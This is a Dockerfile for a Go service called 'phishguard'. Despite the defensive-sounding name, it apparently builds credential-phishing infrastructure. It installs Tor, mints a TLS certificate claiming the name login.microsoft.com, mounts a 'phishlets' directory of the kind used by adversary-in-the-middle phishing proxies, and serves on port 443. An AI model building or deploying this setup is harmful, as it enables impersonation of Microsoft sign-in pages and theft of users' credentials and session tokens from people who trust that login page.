FROM golang:1.21-alpine AS builder
RUN apk add --no-cache git ca-certificates openssl
WORKDIR /app
COPY . .
RUN go mod init phishguard && go mod tidy && go get github.com/go-redis/redis/v8 github.com/gorilla/mux github.com/cespare/xxhash/v2 gopkg.in/yaml.v3 && go build -o phishguard .

FROM alpine:latest
RUN apk --no-cache add ca-certificates tor openssl
WORKDIR /app
COPY --from=builder /app/phishguard .
# Prod Cert Gen (IP SAN; env-injected)
RUN openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 -subj "/CN=localhost" -keyout /app/certs/server.key -out /app/certs/server.crt -addext "subjectAltName=IP:${TOR_IP},DNS:login.microsoft.com"
VOLUME /app/phishlets /app/certs
EXPOSE 443
CMD ["./phishguard"]
